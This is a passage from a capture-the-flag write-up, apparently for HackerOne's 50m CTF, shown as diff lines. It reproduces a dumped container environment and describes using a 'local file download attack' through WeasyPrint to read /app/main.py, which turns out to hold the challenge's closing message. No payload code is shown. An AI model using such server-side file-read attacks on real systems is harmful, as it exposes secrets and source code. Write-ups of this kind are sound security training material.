+NGINX_WORKER_PROCESSES=1UWSGI_CHEAPER=2NGINX_MAX_UPLOAD=0SUPERVISOR_GROUP_NAME=uwsgiPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOME=/rootUWSGI_PROCESSES=16LANG=C.UTF-8SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockPYTHON_VERSION=3.7.2SHLVL=0PYTHON_PIP_VERSION=19.0.1SUPERVISOR_ENABLED=1NJS_VERSION=1.15.8.0.2.7-1~stretchUWSGI_INI=/app/uwsgi.iniNGINX_VERSION=1.15.8-1~stretchSTATIC_PATH=/app/staticGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPYTHONPATH=/appSTATIC_URL=/staticSUPERVISOR_PROCESS_NAME=uwsgiFLAG=nice tryLISTEN_PORT=80HOSTNAME=990292ee4001PWD=/appSTATIC_INDEX=0a
+```
+
+`PYTHONPATH=/app` looks very interesting. Because WeasyPrint uses python, I guessed that the source code of the app is in /app/main.py. Using our local file download attack and providing /app/main.py allows us to obtain the source code, and to my surprise, this was the end of the CTF challenge:
+
+```
+CONGRATULATIONS!
+
+If you're reading this, you've made it to the end of the road for this CTF.
+
+Go to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.
+Make sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!
+
+Congratulations again, and I'm sorry for the red herrings. :)
+```
+
+## Impact
+
+See writeup. Note: ![](img*.jpg) should be attached.
